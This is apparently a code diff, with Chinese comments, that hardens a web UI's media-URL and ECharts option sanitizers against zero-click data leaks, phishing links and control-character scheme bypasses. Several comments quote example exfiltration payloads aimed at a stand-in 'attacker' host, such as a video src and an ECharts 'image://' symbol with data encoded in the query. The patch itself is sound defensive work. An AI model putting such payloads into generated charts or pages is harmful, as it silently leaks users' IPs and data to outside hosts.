@@ -178,15 +178,49 @@ function safeHref(v: unknown): string | undefined {
   return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
 }
 
-/** Media loads bytes, so accept only browser-reachable http(s) or same-origin
- * relative paths. Active/local schemes and protocol-relative URLs are
- * rejected. The renderer always keeps playback user-controlled. */
+/**
+ * CGUI-PATCH(缺口 C / PLAN §5.3 补丁 3):**外部资源引用**的唯一判定,两处消费
+ * (媒体 `src`/`poster`、echart option 里的任意字符串)。收敛成一条,免得再漏别的键名。
+ *
+ * 危害不是 XSS,是**外发**:`<video src="http://attacker/x?d=…">` 与 ECharts 的
+ * `symbol:"image://http://attacker/x?d=…"` / `graphic.style.image` /
+ * `backgroundColor.image` 都让浏览器**零点击**主动连外网,泄露用户 IP 与 URL 里
+ * 编码的任意内容([安全 §3.3 / §5.3])。CC-GUI 公开版用户不该因为看个图表就裸连外网。
+ */
+function isExternalRef(s: string): boolean {
+  return /^(?:image:\/\/|https?:\/\/|\/\/)/i.test(s)
+}
+
+/**
+ * CGUI-PATCH:剔除全部 C0/C1 控制符与空白**再判协议**。上游只 `trim()` 首尾空白,于是
+ * `java<TAB>script:` 被当相对路径放行 —— 而浏览器的 URL 解析器**会**把这些字符剔掉再
+ * 解析,最终就是 `javascript:`([安全 §5.2])。媒体 src 不是导航上下文,当前不可利用;
+ * 但这个 helper 一旦被复用到 `href` / `window.open` 上就直接是 XSS,趁现在修死。
+ *
+ * 只用于**判定**,不改返回值:路径里的空格是路径的一部分,剔掉就换了个地址。
+ */
+function stripControl(s: string): string {
+  // eslint-disable-next-line no-control-regex
+  return s.replace(/[\u0000-\u0020\u007f-\u009f]/g, '')
+}
+
+/**
+ * Media loads bytes, so accept only same-origin relative paths.
+ *
+ * CGUI-PATCH(收紧 T1):上游放行绝对 `http(s)://`,这里改成拒绝 —— 用户零点击就发起
+ * 外连,是 IP/内容外泄向量(INTERFACE §5.4)。上游 SKILL.md 的例子本来就用相对路径,
+ * 影响面小;真要放外链回来,把下面第一条 `isExternalRef` 判断删掉即可。
+ * 其余(任何 scheme、协议相对、反斜杠变形)与上游同,只是判定前先剔控制符。
+ */
 function safeMediaSrc(v: unknown): string | undefined {
   if (typeof v !== 'string') return undefined
   const s = v.trim()
   if (s === '' || s.length > 2048) return undefined
-  if (/^https?:\/\//i.test(s)) return s
-  if (/^[a-z][a-z0-9+.-]*:/i.test(s) || /^[/\\]{2}/.test(s)) return undefined
+  const probe = stripControl(s)
+  if (probe === '') return undefined
+  if (isExternalRef(probe)) return undefined                  // 外链(含 // 协议相对)
+  if (/^[a-z][a-z0-9+.-]*:/i.test(probe)) return undefined     // javascript: / data: / file: / blob: …
+  if (/^[/\\]{2}/.test(probe)) return undefined                // \\host、/\host 等反斜杠变形
   return s
 }
 
@@ -1126,6 +1160,12 @@ function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeB
   // values both as object fields and as array elements.
   if (typeof v === 'string') {
     const s = v.slice(0, GENUI_LIMITS.maxString)
+    // CGUI-PATCH(缺口 C):外部资源引用整条丢弃。图表不需要远程图片,而
+    // `symbol:"image://http://attacker/x?d=…"` / `graphic` 的 `style.image` /
+    // `backgroundColor:{image:"https://…"}` 都不含 `url(`、不命中危险正则,上游一条
+    // 都拦不住([安全 §3.3])—— 用户看个图表就把 IP 和 URL 里编码的内容送了出去。
+    // 判定前先剔控制符,免得 `image:<TAB>//…` 之类的变形绕过。
+    if (isExternalRef(stripControl(s))) return undefined
     // Reject strings containing HTML/script injection patterns or CSS url()
     // (exfiltration channel). Preserves legitimate ECharts string values
     // (labels, plain-text formatter templates, etc.).
@@ -1155,6 +1195,21 @@ function sanitizeEChartOption(v: unknown, depth: number, budget: EChartSanitizeB
     // vector when the option comes from model output).
     if (key === 'tooltip' && typeof s === 'object' && s !== null && !Array.isArray(s)) {
       (s as Record<string, unknown>).renderMode = 'richText'
+    }
+    // CGUI-PATCH(缺口 C):`title.link` / `title.sublink` 整键删除。ECharts 点标题就
+    // `window.open(link)`,是钓鱼跳转通道([安全 §3.3 判为"半拦":`javascript:` 命中
+    // 危险正则被丢,`http://attacker/…` 原样保留)。按**键名**删而不看值 —— 同源相对
+    // 路径一样删,因为"图表标题可点跳转"这个能力本身就不该存在(INTERFACE §5.5)。
+    // 按 title 这一层删而不是全树删 `link`:ECharts 别处也有叫 link 的合法字段。
+    // 多标题(title 是数组)与 baseOption / media 里的 title 都走同一条(递归到那一层
+    // 时 key 同样是 'title')。
+    if (key === 'title' && typeof s === 'object' && s !== null) {
+      for (const one of Array.isArray(s) ? s : [s]) {
+        if (typeof one === 'object' && one !== null && !Array.isArray(one)) {
+          delete (one as Record<string, unknown>).link
+          delete (one as Record<string, unknown>).sublink
+        }
+      }
     }
     out[key] = s
   }
